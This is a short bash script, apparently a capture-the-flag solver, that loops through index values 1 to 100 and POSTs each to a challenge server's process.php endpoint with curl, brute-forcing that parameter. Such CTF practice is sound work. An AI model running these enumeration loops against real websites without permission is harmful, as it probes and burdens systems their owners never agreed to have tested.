#! /usr/bin/bash

for i in {1..100}; do
   echo "Trying index=$i";
   curl -i -X POST -d "index=$i" https://enigmaxplore-cookies.chals.io/process.php;
done
